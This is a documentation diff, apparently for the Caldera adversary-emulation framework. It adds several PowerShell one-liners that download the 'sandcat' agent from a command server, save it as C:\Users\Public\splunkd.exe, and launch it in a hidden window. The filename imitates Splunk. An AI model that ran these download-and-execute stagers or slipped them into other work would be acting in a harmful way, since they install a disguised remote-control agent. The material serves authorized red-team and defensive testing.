@@ -11,3 +11,35 @@ Get-Process | ? {$_.Path -like "C:\Users\Public\splunkd.exe"} | stop-process -f 
 rm -force "C:\Users\Public\splunkd.exe" -ea $ErrAction;
 ([io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data)) | Out-Null;
 Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
+
+
+
+
+
+
+Caldera's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.
+
+$server="http://10.99.156.53:8888";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go");
+$data=$wc.DownloadData($url);
+get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
+rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
+[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+Variations
+
+windows
+psh
+Deploy as a blue-team agent instead of red
+
+$server="http://10.99.156.53:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
+windows
+psh
+Compile red-team agent with a comma-separated list of extensions (requires GoLang).
+
+$server="http://10.99.156.53:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("gocat-extensions", "");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+windows
+psh
